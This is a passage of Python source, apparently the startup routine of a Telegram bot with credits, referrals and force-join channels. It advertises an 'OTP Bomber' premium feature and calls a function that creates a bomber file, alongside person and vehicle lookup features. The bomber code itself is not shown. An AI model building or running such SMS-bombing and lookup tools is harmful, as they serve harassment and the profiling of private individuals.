        # Create default requirements
        with open(global_req_path, 'w') as f:
            f.write("requests\ntelebot\nparamiko\npsutil\ninstaloader\naiohttp\ncolorama\nbeautifulsoup4\n")
        print("✅ Created default global requirements.txt")
    
    # Get channel stats
    public_count = get_channel_count_by_type("public")
    private_count = get_channel_count_by_type("private")
    print(f"📢 Force Channels: {public_count + private_count}")
    print(f"   • Public: {public_count}/{MAX_PUBLIC_CHANNELS}")
    print(f"   • Private: {private_count}/{MAX_PRIVATE_CHANNELS}")
    
    # Get feature stats
    enabled_features = sum(1 for feature, enabled in settings_db.get('feature_flags', {}).items() if enabled)
    total_features = len(settings_db.get('feature_flags', {}))
    print(f"🔧 Feature Control: {enabled_features}/{total_features} features enabled")
    
    print("═" * 50)
    print("🎁 Referral Rewards System:")
    for threshold, reward in REFERRAL_REWARDS.items():
        print(f"   • {threshold} points → {reward['name']}")
    
    print("═" * 50)
    print("🆕 New Features Added:")
    print("   • 🚗 Vehicle Lookup (2 credits)")
    print("   • 🕵️ Sherlock Lookup (1 credit)")
    print("   • 💣 OTP Bomber (Premium only)")
    print("   • 📧 Temp Mail System (Fixed)")
    print("   • 🔧 Feature Control Panel")
    print("   • 🌐 API Management Panel")
    
    print("═" * 50)
    print("🌐 Current APIs:")
    for api_name, api_url in apis_db.items():
        print(f"   • {api_name}: {api_url[:50]}...")
    
    print("═" * 50)
    print("🤖 Bot is now running...")
    
    # Auto-save databases every 5 minutes
    def auto_save():
        while True:
            time.sleep(300)  # 5 minutes
            try:
                save_all_databases()
                print("💾 Databases auto-saved")
            except:
                pass
    
    threading.Thread(target=auto_save, daemon=True).start()
    
    # Create bomber directory and file
    create_ultra_bomber_file()
    
    # Start bot with error handling
    try:
        print("🔄 Bot polling started...")
        bot.infinity_polling(skip_pending=True, timeout=60, long_polling_timeout=60)
    except Exception as e:
        print(f"❌ Bot crashed: {e}")
        print("🔄 Restarting in 10 seconds...")
        time.sleep(10)
        # Restart the script
        os.execv(sys.executable, [sys.executable] + sys.argv)
